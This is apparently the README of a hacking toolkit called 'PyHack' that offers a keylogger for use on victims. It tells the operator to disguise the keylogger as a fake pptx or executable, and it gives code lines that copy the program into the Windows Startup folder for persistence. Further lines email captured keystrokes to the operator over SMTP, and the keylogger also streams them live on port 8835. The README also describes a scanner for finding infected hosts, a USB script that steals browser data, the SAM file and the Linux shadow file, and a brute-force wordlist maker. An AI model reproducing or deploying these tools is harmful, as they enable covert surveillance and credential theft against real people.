# PyHack
KEYLOGGER :
Keylogger is, obviously a keylogger. feel free to rename it, make a windows executable, false pptx file or whatever you want. This keylogger will send you emails of whatever the victim is tiping and, if you are in the same private network, provide a "live keylogger feature wich allows you to see what the vitcim is typing in live. 

This keylogger broadcasts the live on the port 8835, feel free to change it on the line :

self.socket.bind(('',8835))

Just modify the

shutil.copyfile("{}/keylogger.exe".format(os.getcwd()),"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe".format(getpass.getuser()))


line by removing keyllogger.exe to the file name. this line will copy the script itself on the startup file of windows and make it start at each startup of the computer.
please also modify these line with your own email address.


msg['From'] = "exemple@gmail.com"
msg['To'] = COMMASPACE.join("exemple@gmail.com")

smtp.login("exemple@gmail.com","exemple_password")
smtp.sendmail("exemple@gmail.com","exemple@gmail.com",msg.as_string())

and if you are not using gmail, please modify the smtp server addres on the line :

smtp = smtplib.SMTP('smtp.gmail.com')


KEYLOGGER_RECEVER : 
Keylogger recever is a script you use in the same private network than your vitctim's computer to access the live keylogger. But to access the live, you will need the local ip address of the vitctim's computer. use the "virus_scanner" script to perform a local network scan and get the ip address. by default the keylogger uses the 8835 port, if you haven't changed it this is the port you will need to specify. 

VIRUS_SCANNER :
Virus scanner is a script wich perform a network scan and show what ip addresses are infected. by default the keylogger uses the 8835 port, if you haven't changed it this is the port you will need to specify. This script may takes about 70/120 s to scan the entire network.

DATA CATCHER:
Data catcher is a script made to be run from an USB key, it simply copy copy all the sensitive data like Browsers data and SAM file from the computer to the USB key. Will not work if the app is not on her default installation path. Only the shadow file will be stolen on a linux machine.
WORDLIST_MAKER:
Simple wordlist maker, to make more specific bruteforce attacks.
